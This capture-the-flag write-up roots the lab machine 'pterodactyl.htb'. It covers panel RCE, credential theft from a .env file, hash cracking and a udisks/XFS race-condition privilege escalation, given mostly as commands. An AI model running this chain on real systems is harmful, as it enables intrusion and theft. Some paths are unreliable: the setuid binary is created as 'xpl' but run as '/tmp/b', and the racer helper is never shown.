# Findings – Exploitation Methodology

## Overview
This document outlines the full methodology followed to obtain user-level access and escalate privileges to root on the target system.

---

## User Access Methodology

### 1. Initial Reconnaissance

```bash
sudo nmap 10.129.40.218 -p- -sV -sC
```

Identified open ports:

22 (SSH)
80 (HTTP)

### 2. Web Enumeration

```bash
gobuster dir -u http://pterodactyl.htb -w common.txt
```
Discovered:

/index.php
/phpinfo.php

### 3. Service Identification

```bash
curl -I http://panel.pterodactyl.htb
```
Confirmed Pterodactyl panel
PHP backend detected

### 4. Exploitation (RCE)

```bash
python3 exploit.py http://panel.pterodactyl.htb \
--rce-cmd "id" \
--pear-dir /usr/share/php/PEAR
```
Achieved command execution:

uid=474(wwwrun)

### 5. Post-Exploitation – File Enumeration

```bash
ls -la /var/www/pterodactyl
```
Located .env file

```bash
cat /var/www/pterodactyl/.env
```
Extracted credentials:

DB_USERNAME=pterodactyl
DB_PASSWORD=PteraPanel

### 6. Database Access

```bash
mysql -u pterodactyl -pPteraPanel -h 127.0.0.1 \
-e "USE panel; SELECT username,password FROM users;"
```
Retrieved password hashes

### 7. Password Cracking

```bash
hashcat -m 3200 phileasfogg3.txt rockyou.txt
```

Cracked credentials:

phileasfogg3 : !QAZ2wsx

### 8. User Access
```bash
su phileasfogg3
cat /home/phileasfogg3/user.txt
```


## Root Privilege Escalation Methodology

### 1. Environment Preparation

```bash
echo -e "XDG_SEAT=seat0\nXDG_VTNR=1" > ~/.pam_environment
echo $XDG_SEAT
echo $XDG_VTNR
```

### 2. Create XFS Image

```bash
dd if=/dev/zero of=/tmp/xfs_new.img bs=1M count=300
/sbin/mkfs.xfs -f /tmp/xfs_new.img
```

### 3. Transfer Image to Attacker
```bash
scp phileasfogg3@TARGET_IP:/tmp/xfs_new.img /tmp/xfs_new.img
```

### 4. Modify Image (Kali)

```bash
sudo losetup -fP /tmp/xfs_new.img
losetup -a
sudo mount /dev/loop0 /tmp/mnt
sudo cp /bin/bash /tmp/mnt/xpl
sudo chmod 4755 /tmp/mnt/xpl
ls -la /tmp/mnt/xpl

```

### 5. Run Race Helper

```bash
/tmp/racer &
```

### 6. Setup Loop Device (Target)

```bash
udisksctl loop-setup -f /tmp/xfs_new.img --no-user-interaction
```

### 7. Trigger Race Condition

```bash
for i in $(seq 1 300); do
  gdbus call --system \
    --dest org.freedesktop.UDisks2 \
    --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
    --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}' 2>/dev/null &
done
wait
```

### 8. Privilege Escalation

```bash
/tmp/b -p
whoami
```
output -> root

### Root Flag

```bash
cat /root/root.txt
```



